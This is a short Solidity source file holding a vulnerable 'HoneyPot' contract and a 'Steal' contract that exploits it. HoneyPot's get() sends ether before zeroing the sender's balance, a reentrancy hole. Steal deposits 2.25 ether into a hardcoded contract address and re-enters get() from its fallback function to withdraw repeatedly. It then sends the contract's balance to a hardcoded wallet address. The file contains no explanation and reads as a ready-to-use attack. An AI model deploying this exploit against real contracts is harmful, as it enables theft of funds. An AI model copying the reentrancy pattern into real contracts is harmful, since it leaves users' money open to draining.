pragma solidity ^0.4.8;

contract HoneyPot {
    mapping (address => uint) public balances;

    function HoneyPot() payable {
        put();
    }

    function put() payable {
        balances[msg.sender] = msg.value;
    }

    function get() {
        if (!msg.sender.call.value(balances[msg.sender])()) {
            throw;
        }
        balances[msg.sender] = 0;
    }

    function() {
        throw;
    }
}
contract Steal  {
    
    function  primePot  () payable {
        address HPAddy = 0x7fe1b16B5c38B61F4e29Adc45D9574ae4Dd865FD;
        HoneyPot(HPAddy).put.gas(200000).value(2.25 ether)();
    }
    
    function cashout () {
        address me = 0xaa97fca4429b6872572F08a1fA0F4129808a4e5D;
        me.send(this.balance);
    }
    
    function  () payable {
        if(this.balance<4 ether){
        address HPAddy = 0x7fe1b16B5c38B61F4e29Adc45D9574ae4Dd865FD;
        HoneyPot(HPAddy).get.gas(100000)();
        }
    }
    

}
